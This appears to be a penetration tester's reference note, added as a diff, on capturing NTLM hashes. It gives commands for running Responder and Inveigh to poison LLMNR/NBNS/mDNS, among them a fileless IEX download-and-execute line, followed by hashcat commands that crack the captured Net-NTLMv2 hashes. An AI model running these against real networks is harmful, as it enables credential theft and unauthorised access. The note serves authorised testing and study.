@@ -1,0 +1,100 @@
+---
+Primary_category: "[[NTLM]]"
+title: "NTLM CAPTURE"
+draft: false
+banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
+banner_y: 0.88286
+tags:
+cssclasses:
+---
+
+###### PRIMARY CATEGORY → [[NTLM]]
+
+#### *Theory*
+
+An operator could force or coerce a *remote machine* to authenticate against a *rogue server* controlled by himself in order to grab the corresponding *Net-NTLMv2* hash within the *NTLM Message Type 3*
+
+---
+
+#### *Abusing from UNIX-like*
+
+##### *Responder*
+
+> ***[Responder](https://github.com/lgandx/Responder)***
+
+###### *Setup*
+
+```bash
+git clone https://github.com/lgandx/Responder Responder
+```
+
+```bash
+cd !$ && python3 -m venv .venv
+. !$/bin/activate && pip3 install -r requirements.txt
+```
+
+###### *Usage*
+
+```bash
+python3 Responder.py --interface <INTERFACE>
+```
+
+---
+
+#### *Abusing from Windows*
+
+##### *Inveigh.ps1*
+
+> ***[Inveight](https://github.com/Kevin-Robertson/Inveigh)***
+
+###### *Setup*
+
+- ***Fileless***
+
+```bash
+IEX (New-Object Net.WebClient).downloadString('https://github.com/Kevin-Robertson/Inveigh/raw/refs/heads/master/Inveigh.ps1')
+```
+
+- ***Touching Disk***
+
+```bash
+IWR -UseBasicParsing -Uri 'https://github.com/Kevin-Robertson/Inveigh/raw/refs/heads/master/Inveigh.ps1' -OutFile '.\Inveigh.ps1'
+```
+
+```bash
+Import-Module .\Inveigh.ps1
+```
+
+###### *Usage*
+
+```bash
+Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y
+```
+
+##### *Inveigh.exe*
+
+> ***[Inveigh.exe](https://github.com/Kevin-Robertson/Inveigh)***
+
+```powershell
+.\Inveigh.exe
+```
+
+---
+
+#### *Cracking Net-NTLMv2 Hashes*
+
+##### *Hashcat*
+
+> ***[Hashcat](https://github.com/hashcat/hashcat)***
+
+> ***Hashcat Type → 5600***
+
+> ***See [[WINDOWS CREDENTIALS CRACKING#Net-NTLMv2 Response|here]]***
+
+```bash
+hashcat --force -O --attack-mode 0 --hash-type 5600 <HASH> <WORDLIST>
+```
+
+```bash
+hashcat --force -O --attack-mode 0 --hash-type 5600 <HASH> <WORDLIST> --show
+```
